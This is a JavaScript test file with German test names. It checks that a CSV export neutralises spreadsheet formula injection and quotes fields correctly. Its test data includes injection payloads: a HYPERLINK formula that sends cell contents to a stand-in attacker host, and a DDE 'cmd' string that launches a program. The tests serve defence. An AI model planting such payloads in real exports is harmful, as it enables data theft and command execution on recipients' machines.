// ============================================================================
// tests/csvSchreiben.test.mjs — Formelschutz und Quoting beim CSV-Export
//
// Befund: 18 Erzeugerstellen, keine einzige neutralisierte =, +, - oder @ am
// Feldanfang. Lieferantennamen aus der Beleg-Erkennung und Feldnamen aus
// hochgeladenen Fremddateien landeten ungefiltert in einer CSV, die beim
// Steuerberater in Excel geoeffnet wird.
// ============================================================================

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { csvFeld, csvZeile, csvText, formelVerdacht, TRENNER } from '../out/csvSchreiben.js';

// --- Formelschutz -----------------------------------------------------------

test('der gemeldete Fall: eine HYPERLINK-Formel wird entschaerft', () => {
  const boese = '=HYPERLINK("http://boese.example/"&A1;"Rechnung oeffnen")';
  const feld = csvFeld(boese);
  assert.ok(!feld.startsWith('='), 'das Feld beginnt immer noch mit =');
  assert.ok(feld.includes("'="), 'das Apostroph fehlt');
});

test('alle vier gefaehrlichen Anfangszeichen werden erkannt', () => {
  for (const t of ['=1+1', '@SUM(A1)', '\tirgendwas', '\rirgendwas', '=cmd|\' /C calc\'!A0']) {
    assert.equal(formelVerdacht(t), true, JSON.stringify(t) + ' gilt als harmlos');
    assert.ok(csvFeld(t).includes("'"), JSON.stringify(t) + ' wird nicht geschuetzt');
  }
});

test('ZAHLEN bleiben Zahlen — sonst zerbricht jede Summe in Excel', () => {
  const zahlen = ['-1234,50', '-1.234,50', '+7', '-0,01', '1234.50', '-1234.5', '0', '-0'];
  for (const z of zahlen) {
    assert.equal(formelVerdacht(z), false, z + ' wird faelschlich als Formel behandelt');
    assert.equal(csvFeld(z), z, z + ' wurde veraendert zu ' + csvFeld(z));
  }
});

test('was nur wie eine Zahl anfaengt, wird geschuetzt', () => {
  for (const t of ['+49 170 1234567', '-cmd|\' /C calc\'!A0', '-- Kommentar', '+ Zuschlag', '-1.2.3']) {
    assert.equal(formelVerdacht(t), true, JSON.stringify(t) + ' gilt als Zahl');
  }
});

test('normaler Text bleibt unveraendert', () => {
  for (const t of ['Müller GmbH', 'Rechnung 2026-0001', 'Wand streichen', 'EÜR', '19%', 'a=b']) {
    assert.equal(csvFeld(t), t, JSON.stringify(t) + ' wurde veraendert');
  }
});

test('leer bleibt leer, null wird nicht zu "null"', () => {
  assert.equal(csvFeld(''), '');
  assert.equal(csvFeld(null), '');
  assert.equal(csvFeld(undefined), '');
  assert.equal(formelVerdacht(''), false);
});

// --- Quoting nach RFC 4180 --------------------------------------------------

test('Trennzeichen, Anfuehrungszeichen und Umbrueche werden gequotet', () => {
  assert.equal(csvFeld('Meier; Sohn'), '"Meier; Sohn"');
  assert.equal(csvFeld('5" Rohr'), '"5"" Rohr"');
  assert.equal(csvFeld('Zeile1\nZeile2'), '"Zeile1\nZeile2"');
});

test('das Semikolon wird nicht mehr stillschweigend zu einem Komma', () => {
  const alt = String('Meier; Sohn').replace(/;/g, ',');
  assert.notEqual(csvFeld('Meier; Sohn'), alt, 'der alte Weg veraenderte den Namen des Lieferanten');
  assert.ok(csvFeld('Meier; Sohn').includes(';'), 'das Semikolon gehoert erhalten, nur eingepackt');
});

test('geschuetzt UND gequotet, wenn beides noetig ist', () => {
  const feld = csvFeld('=A1;B2');
  assert.equal(feld, '"\'=A1;B2"');
});

test('ein anderes Trennzeichen wird beachtet', () => {
  assert.equal(csvFeld('a;b', ','), 'a;b', 'bei Komma-Trennung ist ein Semikolon harmlos');
  assert.equal(csvFeld('a,b', ','), '"a,b"');
});

// --- Zeilen und ganze Dateien -----------------------------------------------

test('eine Zeile setzt sich aus geschuetzten Feldern zusammen', () => {
  assert.equal(csvZeile(['Datum', 'Lieferant', 'Netto']), 'Datum;Lieferant;Netto');
  assert.equal(csvZeile(['01.09.2026', '=BOESE()', '-1234,50']), "01.09.2026;'=BOESE();-1234,50");
});

test('eine ganze Datei bekommt BOM und CRLF', () => {
  const datei = csvText([['Kopf1', 'Kopf2'], ['a', 'b']]);
  assert.ok(datei.startsWith('﻿'), 'ohne BOM zeigt Excel Umlaute falsch');
  assert.ok(datei.includes('\r\n'), 'Excel unter Windows erwartet CRLF');
  assert.equal(datei, '﻿Kopf1;Kopf2\r\na;b');
});

test('BOM und Zeilenende lassen sich abschalten', () => {
  const datei = csvText([['a'], ['b']], { bom: false, zeilenende: '\n' });
  assert.equal(datei, 'a\nb');
});

test('der Standard-Trenner ist das Semikolon', () => {
  assert.equal(TRENNER, ';');
});

// --- Der Angriff endet hier -------------------------------------------------

test('keine Zeile einer erzeugten Datei beginnt mit einem Formelzeichen', () => {
  const boese = [
    ['=HYPERLINK("http://x")', 'Beleg 1', '-100,00'],
    ['@SUM(1:1)', 'Beleg 2', '250,00'],
    ['+49 170 1234567', 'Beleg 3', '-1.234,50'],
    ['-cmd|\' /C calc\'!A0', 'Beleg 4', '0,00'],
  ];
  const datei = csvText([['Lieferant', 'Text', 'Betrag'], ...boese]);
  for (const zeile of datei.replace('﻿', '').split('\r\n')) {
    for (const feld of zeile.split(';')) {
      const roh = feld.replace(/^"|"$/g, '');
      assert.ok(!/^[=@\t\r]/.test(roh), 'gefaehrliches Feld durchgerutscht: ' + JSON.stringify(roh));
      if (/^[+\-]/.test(roh)) {
        assert.ok(/^[+-]?[\d.,]+$/.test(roh), 'gefaehrliches Feld durchgerutscht: ' + JSON.stringify(roh));
      }
    }
  }
  assert.ok(datei.includes('-1.234,50'), 'die negative Zahl wurde beschaedigt');
});

test('werte.map(csvFeld) reicht den Index durch — das darf nichts kaputtmachen', () => {
  // Array.map ruft csvFeld(wert, index, array) auf. Ohne Haerte waere der
  // Trenner die Zahl 0/1/2 und ein Semikolon im Feld bliebe ungequotet.
  const zeile = ['Meier; Sohn', 'b;c', '=BOESE()'].map(csvFeld).join(';');
  assert.equal(zeile, '"Meier; Sohn";"b;c";\'=BOESE()');
});
